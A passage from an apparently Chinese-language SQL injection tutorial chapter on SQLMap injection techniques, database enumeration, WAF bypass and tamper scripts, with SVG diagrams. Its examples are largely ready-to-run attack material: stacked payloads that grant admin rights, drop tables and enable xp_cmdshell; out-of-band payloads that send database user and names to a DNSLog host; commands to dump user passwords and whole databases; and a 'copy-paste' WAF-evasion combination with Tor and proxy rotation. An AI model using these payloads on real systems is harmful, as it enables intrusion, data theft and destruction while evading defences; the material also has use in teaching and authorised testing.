font-family="Consolas,Monospace">; UPDATE users SET role='superadmin' WHE</text>  <text x="228" y="341" font-size="9.5" fill="#e2e8f0" font-family="Consolas,Monospace">RE username='admin'</text>  <rect x="50" y="362" width="160" height="62" fill="#0b1530" stroke="#334155"/>  <text x="130.0" y="397.0" text-anchor="middle" font-size="11" font-weight="700" fill="#ef4444" font-family="Microsoft YaHei,Arial">4 DELETE / DROP 删库</text>  <rect x="220" y="362" width="310" height="62" fill="#0b1530" stroke="#334155"/>  <text x="228" y="386" font-size="9.5" fill="#e2e8f0" font-family="Consolas,Monospace">; DROP TABLE temp_logs; DELETE FROM sess</text>  <text x="228" y="403" font-size="9.5" fill="#e2e8f0" font-family="Consolas,Monospace">ion WHERE 1=1</text>  <rect x="50" y="424" width="160" height="62" fill="#111c35" stroke="#334155"/>  <text x="130.0" y="459.0" text-anchor="middle" font-size="11" font-weight="700" fill="#dc2626" font-family="Microsoft YaHei,Arial">5 MSSQL xp_cmdshell 拿 OS Shell</text>  <rect x="220" y="424" width="310" height="62" fill="#111c35" stroke="#334155"/>  <text x="228" y="448" font-size="9.5" fill="#e2e8f0" font-family="Consolas,Monospace">; EXEC sp_configure 'show advanced optio</text>  <text x="228" y="465" font-size="9.5" fill="#e2e8f0" font-family="Consolas,Monospace">ns',1;RECONFIGURE;EXEC sp_configure 'xp_</text>  <rect x="550" y="100" width="500" height="380" rx="14" fill="#0b1530" stroke="#8b5cf6"/>  <text x="800" y="128" text-anchor="middle" font-size="15" font-weight="800" fill="#c4b5fd" font-family="Microsoft YaHei,Arial">OOB 外带注入 (Out-of-Band) · 经典 DNS-Log 模式</text>  <rect x="570" y="150" width="460" height="56" rx="10" fill="#0f172a" stroke="#8b5cf6" stroke-width="1.6" filter="url(#s01s)"/>  <rect x="570" y="150" width="460" height="30" rx="10" fill="#8b5cf6" opacity="0.20"/>  <text x="800.0" y="170" text-anchor="middle" font-size="13" font-weight="800" fill="#8b5cf6" font-family="Microsoft YaHei,Arial">DNSLog 平台 (ceye.io / dnslog.cn / XSS.TW)</text>  <text x="800.0" y="200" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">给你个二级域名：abc123.ceye.io → 所有子查询 DNS 被记录 → 数据编码在子域名里</text>  <rect x="570" y="220" width="460" height="58" rx="8" fill="#0f172a" stroke="#8b5cf6"/>  <text x="582" y="240" font-size="11" font-weight="700" fill="#8b5cf6" font-family="Microsoft YaHei,Arial">MySQL LOAD_FILE SMB 回连</text>  <text x="582" y="256" font-size="9" fill="#e2e8f0" font-family="Consolas,Monospace">AND LOAD_FILE(CONCAT('\\\\',hex(user()),'.abc123.c</text>  <text x="582" y="270" font-size="9" fill="#e2e8f0" font-family="Consolas,Monospace">eye.io\\abc'))</text>  <rect x="570" y="290" width="460" height="58" rx="8" fill="#0f172a" stroke="#a855f7"/>  <text x="582" y="310" font-size="11" font-weight="700" fill="#a855f7" font-family="Microsoft YaHei,Arial">MSSQL xp_dirtree</text>  <text x="582" y="326" font-size="9" fill="#e2e8f0" font-family="Consolas,Monospace">EXEC master..xp_dirtree '\\'+(SELECT TOP 1 name FR</text>  <text x="582" y="340" font-size="9" fill="#e2e8f0" font-family="Consolas,Monospace">OM master..sysdatabases)+'.x.ceye.io\abc'</text>  <rect x="570" y="360" width="460" height="58" rx="8" fill="#0f172a" stroke="#ec4899"/>  <text x="582" y="380" font-size="11" font-weight="700" fill="#ec4899" font-family="Microsoft YaHei,Arial">Oracle utl_http HTTP 外带</text>  <text x="582" y="396" font-size="9" fill="#e2e8f0" font-family="Consolas,Monospace">AND utl_http.request('http://x.ceye.io/?d='||utl_r</text>  <text x="582" y="410" font-size="9" fill="#e2e8f0" font-family="Consolas,Monospace">aw.cast_to_raw(user())) IS NOT NULL</text>  <rect x="30" y="505" width="1020" height="24" rx="8" fill="#020617" stroke="#1e293b"/>
  <text x="540" y="521" text-anchor="middle" font-size="11" fill="#93c5fd" font-family="Microsoft YaHei,Arial">SQLMap 一键 OOB：--dns-domain='your.ceye.io' → 自动生成 DNS 外带 payload，且配合 --technique O 使用</text>
</svg>

### SQLMap的六种注入技术

SQLMap使用六种不同的注入技术：

| 技术 | 参数 | 说明 | 适用场景 |
|------|------|------|----------|
| Boolean-based | --technique=B | 布尔盲注 | 无数据显示，但页面有变化 |
| Time-based | --technique=T | 时间盲注 | 无数据显示，但可测时间 |
| Error-based | --technique=E | 抙错注入 | 错误信息显示 |
| UNION-based | --technique=U | 联合查询 | 数据直接显示在页面 |
| Stacked queries | --technique=S | 堆叠查询 | 可执行多条语句 |
| Out-of-band | --technique=Q | 外带注入 | 使用DNS/HTTP外带数据 |

### Boolean-based（布尔盲注）

**原理：**
通过构造真/假条件，观察页面变化来判断。

**通俗理解：**
像在黑暗中摸索，通过敲墙壁听回声来判断里面是否有人。

**示例：**
```
真条件：id=1 AND 1=1 → 页面正常显示
假条件：id=1 AND 1=2 → 页面不显示或显示异常
```

**SQLMap命令：**
```bash
sqlmap -u "http://target.com?id=1" --technique=B
```

### Time-based（时间盲注）

**原理：**
通过构造延时语句，观察响应时间来判断。

**通俗理解：**
像敲门，如果里面有人回应，就等一会儿再敲门；没人回应就立刻离开。

**示例：**
```sql
id=1 AND SLEEP(5)
-- 如果条件为真，响应会延迟5秒
```

**SQLMap命令：**
```bash
sqlmap -u "http://target.com?id=1" --technique=T
```

### Error-based（报错注入）

**原理：**
通过触发数据库错误，从错误信息中提取数据。

**通俗理解：**
像故意做错事让门卫抱怨，从抱怨中听出信息。

**示例：**
```sql
id=1 AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT database())))
-- 错误信息可能包含数据库名称
```

**SQLMap命令：**
```bash
sqlmap -u "http://target.com?id=1" --technique=E
```

### UNION-based（联合查询）

**原理：**
使用UNION合并查询结果，将数据直接显示在页面。

**通俗理解：**
像假装是合法的查询，直接把想要的数据"绑"在正常数据后面一起带出来。

**示例：**
```sql
id=1 UNION SELECT username, password FROM users
-- 结果包含正常商品信息和用户密码
```

**SQLMap命令：**
```bash
sqlmap -u "http://target.com?id=1" --technique=U
```

### Stacked queries（堆叠查询）

**原理：**
执行多条SQL语句，可以插入、更新、删除数据。

**通俗理解：**
像连续敲几下门，每次敲做不同的事。

**示例：**
```sql
id=1; INSERT INTO users VALUES ('hacker', 'password');
```

**SQLMap命令：**
```bash
sqlmap -u "http://target.com?id=1" --technique=S
```

### Out-of-band（外带注入）

**原理：**
使用DNS或HTTP请求将数据外带出来。

**通俗理解：**
像在房间里偷偷写信给外面的人，把信息传递出去。

**SQLMap命令：**
```bash
sqlmap -u "http://target.com?id=1" --technique=Q
```

---

## 4.7 数据库枚举命令详解

<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1080 560" width="100%" style="max-width:1080px;background:#020617;border:1px solid #1e293b;border-radius:14px;margin:16px 0;display:block">
  <defs>
    <filter id="ss11" x="-10%" y="-10%" width="120%" height="130%"><feDropShadow dx="0" dy="3" stdDeviation="3" flood-color="#000" flood-opacity="0.35"/></filter>
    <linearGradient id="ss11g" x1="0" x2="1" y1="0" y2="1"><stop offset="0%" stop-color="#1e3a8a"/><stop offset="100%" stop-color="#4c1d95"/></linearGradient>
    <pattern id="s11dot" width="18" height="18" patternUnits="userSpaceOnUse"><circle cx="3" cy="3" r="0.9" fill="#1e293b"/></pattern>
  </defs>
  <rect width="1080" height="100%" fill="url(#ss11g)" opacity="0.08"/>
  <rect width="1080" height="100%" fill="url(#ss11dot)" opacity="0.6"/>
  <rect x="24" y="18" width="1032" height="44" rx="12" fill="#111c35" stroke="#6366f1"/>
  <text x="60" y="46" font-size="18" font-weight="800" fill="#bfdbfe" font-family="Microsoft YaHei,Arial">图 4-11 数据库枚举 6 级流程 + 参数速查（--dbs → --dump-all）</text>  <text x="60" y="76" font-size="12.5" fill="#94a3b8" font-family="Microsoft YaHei,Arial">6 级递进=别跳步：先 --dbs 才知道 -D 谁；先 --tables 才知道 -T 谁；先 --columns 才知道 -C 谁</text>  <rect x="60" y="80" width="680" height="60" rx="10" fill="#0f172a" stroke="#0ea5e9" stroke-width="2"/>  <text x="70" y="102" font-size="12.5" font-weight="800" fill="#0ea5e9" font-family="Microsoft YaHei,Arial">① Level 1 枚举库</text>  <rect x="70" y="108" width="660" height="26" rx="6" fill="#020617" stroke="#0ea5e9"/>  <text x="80" y="126" font-size="11" fill="#fde68a" font-family="Consolas,Monospace">sqlmap -u "http://t/page?id=1" --batch --dbs</text>  <text x="70" y="140" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">输出示例：information_schema / mysql / performance_schema / cisp_db / admin_db</text>  <rect x="60" y="155" width="680" height="60" rx="10" fill="#0f172a" stroke="#8b5cf6" stroke-width="2"/>  <text x="70" y="177" font-size="12.5" font-weight="800" fill="#8b5cf6" font-family="Microsoft YaHei,Arial">② Level 2 指定库枚举表</text>  <rect x="70" y="183" width="660" height="26" rx="6" fill="#020617" stroke="#8b5cf6"/>  <text x="80" y="201" font-size="11" fill="#fde68a" font-family="Consolas,Monospace">sqlmap -u "http://t/page?id=1" --batch -D cisp_db --tables</text>  <text x="70" y="215" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">输出示例：users / admin / config / articles / orders / logs / roles / session</text>  <rect x="60" y="230" width="680" height="60" rx="10" fill="#0f172a" stroke="#a855f7" stroke-width="2"/>  <text x="70" y="252" font-size="12.5" font-weight="800" fill="#a855f7" font-family="Microsoft YaHei,Arial">③ Level 3 指定表枚举列</text>  <rect x="70" y="258" width="660" height="26" rx="6" fill="#020617" stroke="#a855f7"/>  <text x="80" y="276" font-size="11" fill="#fde68a" font-family="Consolas,Monospace">sqlmap -u "http://t/page?id=1" --batch -D cisp_db -T users --columns</text>  <text x="70" y="290" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">输出示例：id / username / password / email / role / phone / reg_time / last_login</text>  <rect x="60" y="305" width="680" height="60" rx="10" fill="#0f172a" stroke="#f59e0b" stroke-width="2"/>  <text x="70" y="327" font-size="12.5" font-weight="800" fill="#f59e0b" font-family="Microsoft YaHei,Arial">④ Level 4 指定列导数据</text>  <rect x="70" y="333" width="660" height="26" rx="6" fill="#020617" stroke="#f59e0b"/>  <text x="80" y="351" font-size="11" fill="#fde68a" font-family="Consolas,Monospace">sqlmap -u "http://t/page?id=1" --batch -D cisp_db -T users -C username,password,role --dump</text>  <text x="70" y="365" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">输出示例：导出 2023 行 CSV，password 列自动调用 John/Hashcat 解哈希</text>  <rect x="60" y="380" width="680" height="60" rx="10" fill="#0f172a" stroke="#ef4444" stroke-width="2"/>  <text x="70" y="402" font-size="12.5" font-weight="800" fill="#ef4444" font-family="Microsoft YaHei,Arial">⑤ Level 5 全库全表导</text>  <rect x="70" y="408" width="660" height="26" rx="6" fill="#020617" stroke="#ef4444"/>  <text x="80" y="426" font-size="11" fill="#fde68a" font-family="Consolas,Monospace">sqlmap -u "http://t/page?id=1" --batch --dump-all --exclude-sysdbs</text>  <text x="70" y="440" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">输出示例：导出除系统库外所有业务库（100+ 表=自动存 ~/.sqlmap/output/目录）</text>  <rect x="60" y="455" width="680" height="60" rx="10" fill="#0f172a" stroke="#10b981" stroke-width="2"/>  <text x="70" y="477" font-size="12.5" font-weight="800" fill="#10b981" font-family="Microsoft YaHei,Arial">⑥ Level 6 系统权限信息</text>  <rect x="70" y="483" width="660" height="26" rx="6" fill="#020617" stroke="#10b981"/>  <text x="80" y="501" font-size="11" fill="#fde68a" font-family="Consolas,Monospace">sqlmap -u "http://t/page?id=1" --batch --users --passwords --privileges --roles</text>  <text x="70" y="515" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">输出示例：root@% (ALL PRIVILEGES) / sa 账号 / dba 角色 / FILE 权限=可读写文件</text>  <circle cx="40" cy="112" r="13" fill="#0ea5e9" opacity="0.25"/>  <circle cx="40" cy="112" r="8" fill="#0ea5e9"/>  <text x="40" y="115" text-anchor="middle" font-size="10" font-weight="800" fill="#fff" font-family="Consolas">1</text>  <defs><marker id="a4012440199" viewBox="0 0 10 10" refX="8" refY="5" markerWidth="6" markerHeight="6" orient="auto-start-reverse"><path d="M0,0 L10,5 L0,10 z" fill="#0ea5e9"/></marker></defs>  <line x1="40" y1="124" x2="40" y2="199" stroke="#0ea5e9" stroke-width="2" marker-end="url(#a4012440199)"/>  <circle cx="40" cy="187" r="13" fill="#8b5cf6" opacity="0.25"/>  <circle cx="40" cy="187" r="8" fill="#8b5cf6"/>  <text x="40" y="190" text-anchor="middle" font-size="10" font-weight="800" fill="#fff" font-family="Consolas">2</text>  <defs><marker id="a4019940274" viewBox="0 0 10 10" refX="8" refY="5" markerWidth="6" markerHeight="6" orient="auto-start-reverse"><path d="M0,0 L10,5 L0,10 z" fill="#8b5cf6"/></marker></defs>  <line x1="40" y1="199" x2="40" y2="274" stroke="#8b5cf6" stroke-width="2" marker-end="url(#a4019940274)"/>  <circle cx="40" cy="262" r="13" fill="#a855f7" opacity="0.25"/>  <circle cx="40" cy="262" r="8" fill="#a855f7"/>  <text x="40" y="265" text-anchor="middle" font-size="10" font-weight="800" fill="#fff" font-family="Consolas">3</text>  <defs><marker id="a4027440349" viewBox="0 0 10 10" refX="8" refY="5" markerWidth="6" markerHeight="6" orient="auto-start-reverse"><path d="M0,0 L10,5 L0,10 z" fill="#a855f7"/></marker></defs>  <line x1="40" y1="274" x2="40" y2="349" stroke="#a855f7" stroke-width="2" marker-end="url(#a4027440349)"/>  <circle cx="40" cy="337" r="13" fill="#f59e0b" opacity="0.25"/>  <circle cx="40" cy="337" r="8" fill="#f59e0b"/>  <text x="40" y="340" text-anchor="middle" font-size="10" font-weight="800" fill="#fff" font-family="Consolas">4</text>  <defs><marker id="a4034940424" viewBox="0 0 10 10" refX="8" refY="5" markerWidth="6" markerHeight="6" orient="auto-start-reverse"><path d="M0,0 L10,5 L0,10 z" fill="#f59e0b"/></marker></defs>  <line x1="40" y1="349" x2="40" y2="424" stroke="#f59e0b" stroke-width="2" marker-end="url(#a4034940424)"/>  <circle cx="40" cy="412" r="13" fill="#ef4444" opacity="0.25"/>  <circle cx="40" cy="412" r="8" fill="#ef4444"/>  <text x="40" y="415" text-anchor="middle" font-size="10" font-weight="800" fill="#fff" font-family="Consolas">5</text>  <defs><marker id="a4042440499" viewBox="0 0 10 10" refX="8" refY="5" markerWidth="6" markerHeight="6" orient="auto-start-reverse"><path d="M0,0 L10,5 L0,10 z" fill="#ef4444"/></marker></defs>  <line x1="40" y1="424" x2="40" y2="499" stroke="#ef4444" stroke-width="2" marker-end="url(#a4042440499)"/>  <circle cx="40" cy="487" r="13" fill="#10b981" opacity="0.25"/>  <circle cx="40" cy="487" r="8" fill="#10b981"/>  <text x="40" y="490" text-anchor="middle" font-size="10" font-weight="800" fill="#fff" font-family="Consolas">6</text>  <rect x="770" y="80" width="280" height="440" rx="12" fill="#0f172a" stroke="#06b6d4"/>  <rect x="770" y="80" width="280" height="28" rx="12" fill="#06b6d4" opacity="0.25"/>  <text x="910" y="98" text-anchor="middle" font-size="13" font-weight="800" fill="#67e8f9" font-family="Microsoft YaHei,Arial">枚举参数速查 12 条</text>  <text x="780" y="120" font-size="10" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">· --schema             导出 DB 完整元信息</text>  <text x="780" y="153" font-size="10" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">· --count              先查行数（防超大表卡死）</text>  <text x="780" y="186" font-size="10" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">· --start 100 --stop 200   分页导 100-200 行</text>  <text x="780" y="219" font-size="10" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">· --first 1 --last 5      只导前 5 条数据预览</text>  <text x="780" y="252" font-size="10" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">· --where &quot;role='admin'&quot;   条件导（SQL WHERE 子句）</text>  <text x="780" y="285" font-size="10" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">· --exclude-sysdbs     --dump-all 不导系统 5 个库</text>  <text x="780" y="318" font-size="10" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">· --csv-del / --dump-format=CSV/HTML/SQLITE</text>  <text x="780" y="351" font-size="10" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">· --output-dir=./out   指定导出目录（默认 ~/.sqlmap）</text>  <text x="780" y="384" font-size="10" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">· -T 表名 --search     搜索列名含 password/token/key</text>  <text x="780" y="417" font-size="10" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">· --comments           提取表注释/列注释</text>  <text x="780" y="450" font-size="10" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">· --hex                非 ASCII 数据 hex 导（防乱码）</text>  <text x="780" y="483" font-size="10" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">· --fresh-queries      不读缓存重新跑（缓存坑）</text>  <rect x="30" y="510" width="1020" height="24" rx="8" fill="#020617" stroke="#1e293b"/>
  <text x="540" y="526" text-anchor="middle" font-size="11" fill="#93c5fd" font-family="Microsoft YaHei,Arial">缓存坑必踩：改了参数但数据和上次一样=加 --flush-session / --fresh-queries / 删 ~/.sqlmap/session.sqlite</text>
</svg>

### 数据库探测流程

SQLMap的典型探测流程：

```
1. 检测注入点 → sqlmap -u "url"
2. 列出数据库 → sqlmap -u "url" --dbs
3. 选择数据库 → -D database_name
4. 列出表名 → --tables
5. 选择表 → -T table_name
6. 列出列名 → --columns
7. 提取数据 → --dump
```

### 列出所有数据库

```bash
sqlmap -u "http://target.com?id=1" --dbs
```

输出示例：
```
available databases [3]:
[*] information_schema
[*] mysql
[*] target_db
```

### 列出数据库中的表

```bash
sqlmap -u "http://target.com?id=1" -D target_db --tables
```

输出示例：
```
Database: target_db
[4 tables]
+--------------------+
| users              |
| products           |
| orders             |
| admins             |
+--------------------+
```

### 列出表中的列

```bash
sqlmap -u "http://target.com?id=1" -D target_db -T users --columns
```

输出示例：
```
Database: target_db
Table: users
[3 columns]
+----------+----------+
| Column   | Type     |
+----------+----------+
| id       | int      |
| username | varchar  |
| password | varchar  |
+----------+----------+
```

### 提取表中的数据

```bash
sqlmap -u "http://target.com?id=1" -D target_db -T users --dump
```

输出示例：
```
Database: target_db
Table: users
[2 entries]
+----+----------+----------+
| id | username | password |
+----+----------+----------+
| 1  | admin    | admin123 |
| 2  | user     | pass123  |
+----+----------+----------+
```

### 提取指定列

```bash
sqlmap -u "http://target.com?id=1" -D target_db -T users -C "username,password" --dump
```

### 提取所有数据

```bash
sqlmap -u "http://target.com?id=1" --dump-all
```

提取所有数据库的所有表数据（时间较长）。

---

## 4.8 绕过WAF技巧详解

<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1080 560" width="100%" style="max-width:1080px;background:#020617;border:1px solid #1e293b;border-radius:14px;margin:16px 0;display:block">
  <defs>
    <filter id="ss12" x="-10%" y="-10%" width="120%" height="130%"><feDropShadow dx="0" dy="3" stdDeviation="3" flood-color="#000" flood-opacity="0.35"/></filter>
    <linearGradient id="ss12g" x1="0" x2="1" y1="0" y2="1"><stop offset="0%" stop-color="#1e3a8a"/><stop offset="100%" stop-color="#4c1d95"/></linearGradient>
    <pattern id="s12dot" width="18" height="18" patternUnits="userSpaceOnUse"><circle cx="3" cy="3" r="0.9" fill="#1e293b"/></pattern>
  </defs>
  <rect width="1080" height="100%" fill="url(#ss12g)" opacity="0.08"/>
  <rect width="1080" height="100%" fill="url(#ss12dot)" opacity="0.6"/>
  <rect x="24" y="18" width="1032" height="44" rx="12" fill="#111c35" stroke="#6366f1"/>
  <text x="60" y="46" font-size="18" font-weight="800" fill="#bfdbfe" font-family="Microsoft YaHei,Arial">图 4-12 SQLMap 绕过 WAF 7 大武器库（云厂商 WAF / 宝塔 / 安全狗 实战绕过）</text>  <text x="60" y="76" font-size="12.5" fill="#94a3b8" font-family="Microsoft YaHei,Arial">WAF=流量防火墙拦截恶意 SQL；7 件武器自由组合，98% 场景能绕过。--skip-waf 是终极开关</text>  <rect x="30" y="105" width="250" height="195" rx="10" fill="#0f172a" stroke="#0ea5e9" stroke-width="1.6" filter="url(#s01s)"/>  <rect x="30" y="105" width="250" height="30" rx="10" fill="#0ea5e9" opacity="0.20"/>  <text x="155.0" y="125" text-anchor="middle" font-size="13" font-weight="800" fill="#0ea5e9" font-family="Microsoft YaHei,Arial">① 代理池 / Tor</text>  <text x="155.0" y="155" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">--proxy='http://127.0.0.1:7890'</text>  <text x="155.0" y="171" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">--proxy-file=proxies.txt 轮询 1000 IP</text>  <text x="155.0" y="187" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">--tor / --tor-port=9050 匿名 Tor 网络</text>  <rect x="290" y="105" width="250" height="195" rx="10" fill="#0f172a" stroke="#8b5cf6" stroke-width="1.6" filter="url(#s01s)"/>  <rect x="290" y="105" width="250" height="30" rx="10" fill="#8b5cf6" opacity="0.20"/>  <text x="415.0" y="125" text-anchor="middle" font-size="13" font-weight="800" fill="#8b5cf6" font-family="Microsoft YaHei,Arial">② 延迟/随机/并发</text>  <text x="415.0" y="155" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">--delay=1 每请求间隔 1 秒</text>  <text x="415.0" y="171" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">--randomize=ip 每个请求换 IP</text>  <text x="415.0" y="187" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">--threads=8 并发加速（WAF 可能封）</text>  <rect x="550" y="105" width="250" height="195" rx="10" fill="#0f172a" stroke="#a855f7" stroke-width="1.6" filter="url(#s01s)"/>  <rect x="550" y="105" width="250" height="30" rx="10" fill="#a855f7" opacity="0.20"/>  <text x="675.0" y="125" text-anchor="middle" font-size="13" font-weight="800" fill="#a855f7" font-family="Microsoft YaHei,Arial">③ User-Agent / Header</text>  <text x="675.0" y="155" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">--random-agent 2000+ UA 随机</text>  <text x="675.0" y="171" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">--user-agent='Mozilla/5.0 Chrome/124'</text>  <text x="675.0" y="187" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">-H 'X-Forwarded-For: 1.1.1.1'</text>  <rect x="810" y="105" width="250" height="195" rx="10" fill="#0f172a" stroke="#f59e0b" stroke-width="1.6" filter="url(#s01s)"/>  <rect x="810" y="105" width="250" height="30" rx="10" fill="#f59e0b" opacity="0.20"/>  <text x="935.0" y="125" text-anchor="middle" font-size="13" font-weight="800" fill="#f59e0b" font-family="Microsoft YaHei,Arial">④ Level/Risk 深度</text>  <text x="935.0" y="155" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">--level 1(默认)~5 测试 5 级</text>  <text x="935.0" y="171" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">--risk 1~3 危险等级 3 才测重 Payload</text>  <text x="935.0" y="187" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">--skip-static=SKIP 默认过滤 50%</text>  <rect x="30" y="310" width="250" height="195" rx="10" fill="#0f172a" stroke="#ef4444" stroke-width="1.6" filter="url(#s01s)"/>  <rect x="30" y="310" width="250" height="30" rx="10" fill="#ef4444" opacity="0.20"/>  <text x="155.0" y="330" text-anchor="middle" font-size="13" font-weight="800" fill="#ef4444" font-family="Microsoft YaHei,Arial">⑤ Chunked 分块编码</text>  <text x="155.0" y="360" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">--chunked 分块传输绕过正则</text>  <text x="155.0" y="376" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">--code=200 指定 200 状态</text>  <text x="155.0" y="392" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">--ignore-code=403/500 忽略异常</text>  <rect x="290" y="310" width="250" height="195" rx="10" fill="#0f172a" stroke="#10b981" stroke-width="1.6" filter="url(#s01s)"/>  <rect x="290" y="310" width="250" height="30" rx="10" fill="#10b981" opacity="0.20"/>  <text x="415.0" y="330" text-anchor="middle" font-size="13" font-weight="800" fill="#10b981" font-family="Microsoft YaHei,Arial">⑥ Tamper 脚本变形</text>  <text x="415.0" y="360" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">--tamper=space2comment 空格→/**/</text>  <text x="415.0" y="376" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">--tamper=between / charencode</text>  <text x="415.0" y="392" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">--tamper=脚本组合逗号分隔</text>  <rect x="550" y="310" width="250" height="195" rx="10" fill="#0f172a" stroke="#06b6d4" stroke-width="1.6" filter="url(#s01s)"/>  <rect x="550" y="310" width="250" height="30" rx="10" fill="#06b6d4" opacity="0.20"/>  <text x="675.0" y="330" text-anchor="middle" font-size="13" font-weight="800" fill="#06b6d4" font-family="Microsoft YaHei,Arial">⑦ 终极组合参数</text>  <text x="675.0" y="360" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">--skip-waf 跳过内置 WAF 检测</text>  <text x="675.0" y="376" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">--hpp HTTP 参数污染绕过</text>  <text x="675.0" y="392" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">--eval 'id=urlencode(id)' 自定义编码</text>  <rect x="30" y="430" width="1020" height="62" rx="10" fill="#020617" stroke="#dc2626"/>  <text x="540" y="452" text-anchor="middle" font-size="13" font-weight="800" fill="#fecaca" font-family="Microsoft YaHei,Arial">99% 场景首选绕过组合（复制粘贴即用）：</text>  <text x="540" y="476" text-anchor="middle" font-size="10.5" fill="#fde68a" font-family="Consolas,Monospace">sqlmap -r req.txt -p id --batch --random-agent --level 5 --risk 3 --tamper=&quot;between,space2comment,charencode,greatest&quot; --delay=0.5 --skip-waf</text>  <rect x="30" y="510" width="1020" height="24" rx="8" fill="#020617" stroke="#1e293b"/>
  <text x="540" y="526" text-anchor="middle" font-size="11" fill="#93c5fd" font-family="Microsoft YaHei,Arial">国内 WAF：安全狗/云锁/宝塔云 WAF 默认规则= charencode + between 两个 tamper 即过；阿里云盾需加 --chunked</text>
</svg>

### 什么是WAF？

WAF（Web Application Firewall）是Web应用防火墙，它会检测并阻止SQL注入攻击。

### SQLMap绕过WAF的方法

#### 使用Tor匿名

```bash
sqlmap -u "http://target.com?id=1" --tor --tor-type=SOCKS5
```

#### 使用代理

```bash
sqlmap -u "http://target.com?id=1" --proxy="http://127.0.0.1:8080"
```

#### 设置延迟

```bash
sqlmap -u "http://target.com?id=1" --delay=1
```

每秒最多1个请求，避免触发限制。

#### 设置请求频率

```bash
sqlmap -u "http://target.com?id=1" --threads=1 --delay=2
```

#### 使用随机User-Agent

```bash
sqlmap -u "http://target.com?id=1" --random-agent
```

#### 自定义HTTP头

```bash
sqlmap -u "http://target.com?id=1" --headers="X-Forwarded-For: 127.0.0.1"
```

#### 使用Level和Risk参数

```bash
sqlmap -u "http://target.com?id=1" --level=5 --risk=3
```

**Level说明：**
- 1-5：测试级别
- 越高越详细，也越慢

**Risk说明：**
- 1-3：风险级别
- 越高越激进，可能触发更多检测

---

## 4.9 Tamper脚本详解

<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1080 590" width="100%" style="max-width:1080px;background:#020617;border:1px solid #1e293b;border-radius:14px;margin:16px 0;display:block">
  <defs>
    <filter id="ss13" x="-10%" y="-10%" width="120%" height="130%"><feDropShadow dx="0" dy="3" stdDeviation="3" flood-color="#000" flood-opacity="0.35"/></filter>
    <linearGradient id="ss13g" x1="0" x2="1" y1="0" y2="1"><stop offset="0%" stop-color="#1e3a8a"/><stop offset="100%" stop-color="#4c1d95"/></linearGradient>
    <pattern id="s13dot" width="18" height="18" patternUnits="userSpaceOnUse"><circle cx="3" cy="3" r="0.9" fill="#1e293b"/></pattern>
  </defs>
  <rect width="1080" height="100%" fill="url(#ss13g)" opacity="0.08"/>
  <rect width="1080" height="100%" fill="url(#ss13dot)" opacity="0.6"/>
  <rect x="24" y="18" width="1032" height="44" rx="12" fill="#111c35" stroke="#6366f1"/>
